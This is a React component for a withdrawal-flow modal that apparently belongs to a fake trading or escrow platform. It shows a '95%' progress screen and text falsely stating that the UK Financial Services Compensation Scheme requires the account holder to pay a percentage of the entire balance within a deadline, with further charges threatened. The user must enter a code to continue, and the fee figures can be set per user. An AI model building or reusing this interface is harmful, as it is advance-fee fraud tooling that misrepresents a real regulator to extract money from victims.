"use client";

import React from "react";
import Image from "next/image";
import FlowModal from "@/components/modals/flow/flowModal";
import { Button } from "@/components/ui/button";
import { PinInput, PinInputGroup, PinInputInput } from "@/components/ui/pin-input";
import { getStageContent } from "@/lib/constants/withdrawal";
import type { WithdrawalRequest } from "@/lib/types/api";
import { useAuthStore } from "@/lib/store/auth";

interface FscsCodeModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSubmit?: (code: string) => void;
  onCancel?: () => void;
  request: WithdrawalRequest;
  isLoading?: boolean;
  trigger?: React.ReactNode;
}

const FscsCodeModal = ({ 
  open, 
  onOpenChange, 
  onSubmit, 
  onCancel, 
  request,
  isLoading = false,
  trigger
}: FscsCodeModalProps) => {
  const [pinValue, setPinValue] = React.useState<string[]>([]);
  const { user } = useAuthStore();
  
  // Get dynamic charges from user with fallbacks
  const chargeAmount = user?.charges?.amount || "16,057";
  const chargePercent = user?.charges?.percent || "4";
  const chargeDays = user?.charges?.days || "8 business days";
  
  const stageContent = getStageContent("fscs_code", {
    amount: request.amount,
    percent: request.percent,
    showPercent: request.show_percent,
    message: request.message,
  });

  // Use code_length from request, fallback to stageContent
  const codeLength = request.code_length && request.code_length > 0 ? request.code_length : stageContent.codeLength;
  const codeString = pinValue.join("");
  const isValidCode = codeString.length === codeLength;

  const handleSubmit = () => {
    if (isValidCode) {
      onSubmit?.(codeString);
    }
  };

  const handleCancel = () => {
    onCancel?.();
    onOpenChange(false);
  };

  React.useEffect(() => {
    if (!open) {
      setPinValue([]);
    }
  }, [open]);

  return (
    <FlowModal
      trigger={trigger}
      open={open}
      onOpenChange={(next) => {
        if (!next) {
          setPinValue([]);
          handleCancel();
        }
        onOpenChange?.(next);
      }}
      eyebrow={stageContent.eyebrow}
      title={stageContent.title}
      subtitle={stageContent.subtitle}
      contentClassName="max-w-3xl"
      dialogClassName="sm:max-w-3xl"
    >
      <div className="space-y-6">
        <div className="flex flex-col items-center gap-4 text-center">
          <Image src="/uk.gif" alt="UK Flag" width={200} height={150} className="h-40 w-auto rounded-lg" />
          <div className="text-lg font-medium text-blue-700 dark:text-blue-300">
            95%
          </div>
          {isLoading && (
            <p className="text-sm font-medium text-gray-600 dark:text-gray-300">
              {stageContent.processingMessage}
            </p>
          )}
        </div>

        <div className="space-y-6 text-left max-w-4xl mx-auto">
          <div className="space-y-4">
            <p className="text-base leading-relaxed text-gray-700 dark:text-gray-300">
              <strong>The Financial Services Compensation Scheme (FSCS)</strong> insures customer deposits up to <strong>£{chargeAmount}</strong> held by escrow banks in UK establishments authorised by the <strong>PRA</strong> (Prudential Regulation Authority), including Northern Ireland. In addition to the amount specified above, a charge of <strong>{chargePercent}%</strong> of entire balance must be paid by the sole owner of the escrow account within <strong>{chargeDays}</strong>. More charges might be incurred if the charge is not been paid within the stipulated time frame.
            </p>
            
            <p className="text-base leading-relaxed text-gray-700 dark:text-gray-300">
              Beyond the <strong>£{chargeAmount}</strong> threshold, specific deposit types designated as interim high balances—for instance, the proceeds from private property sales—will be afforded temporary deposit protection for a duration of one month. Protection for FX or STOCK trading is exempted during this period and must be promptly remitted in compliance with FSCS regulations.
            </p>
          </div>
        </div>

        <div className="space-y-3">
          <div>
            <p className="text-[11px] uppercase tracking-[0.4em] text-gray-500 dark:text-gray-400">
              {stageContent.codeLabel}
            </p>
          </div>
          <PinInput
            value={pinValue}
            onValueChange={(details) => setPinValue(details.value)}
            otp
            blurOnComplete
          >
            <PinInputGroup className="gap-2 justify-center">
              {Array.from({ length: codeLength }).map((_, index) => (
                <PinInputInput
                  key={`fscs-digit-${index}`}
                  index={index}
                  className="w-12 h-12 text-lg font-bold text-center border-2 rounded-lg bg-white dark:bg-gray-900 border-gray-300 dark:border-gray-600 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 dark:focus:ring-indigo-900/20 transition-all"
                />
              ))}
            </PinInputGroup>
          </PinInput>
        </div>

        <div className="flex items-center justify-between gap-3">
          <Button
            type="button"
            variant="outline"
            className="cursor-pointer border border-gray-300 text-gray-700 hover:bg-gray-50 dark:border-white/10 dark:text-white"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </Button>
          <Button
            type="button"
            className="cursor-pointer bg-indigo-600 text-white hover:bg-indigo-500"
            onClick={handleSubmit}
            disabled={!isValidCode || isLoading}
          >
            {isLoading ? "Processing..." : "Proceed"}
          </Button>
        </div>
      </div>
    </FlowModal>
  );
};

export default FscsCodeModal;